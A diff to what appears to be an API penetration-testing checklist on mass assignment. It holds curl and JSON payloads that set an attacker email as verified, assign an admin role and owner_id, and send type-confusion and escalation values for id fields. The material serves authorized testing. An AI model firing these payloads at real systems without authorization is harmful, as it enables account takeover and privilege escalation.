@@ -62,6 +62,19 @@ curl -X PATCH https://target/api/users/123 -H "Content-Type: application/json" \
 curl -X PATCH https://target/api/users/123 -H "Content-Type: application/json" \
   -d '{"email":"attacker@evil.example","email_verified":true}'
 ```
+- [ ] When injecting an **identifier-bearing** field (`id`, `owner_id`, `user_id`), don't send one
+      guess — classify the value and reuse its type-confusion + escalation variants so you catch
+      binders that coerce types differently than the validator:
+```bash
+aith assess classify-payload 456 --mutations
+#   type: sequential_id
+#   format:     '"456"'  '[456]'  '{"id": 456}'  'null'  '[]'   ← type confusion (string/array/object)
+#   escalation: '1' '0' '2' 'admin' 'root'                       ← reassign to first/admin object
+#   boundary:   '0' '-1' '1' '99999999' '2147483647'
+```
+      Send the `escalation` variants to reassign the record to the first/admin object, and the
+      `format` variants because some ORMs accept `"456"`/`[456]` where strict validation expects an
+      int — a binding gap that lets a field through.
 - [ ] Test field overwrite on related objects (nested assignment)
 ```json
 {"profile": {"role": "admin"}, "organization": {"owner_id": 123}}
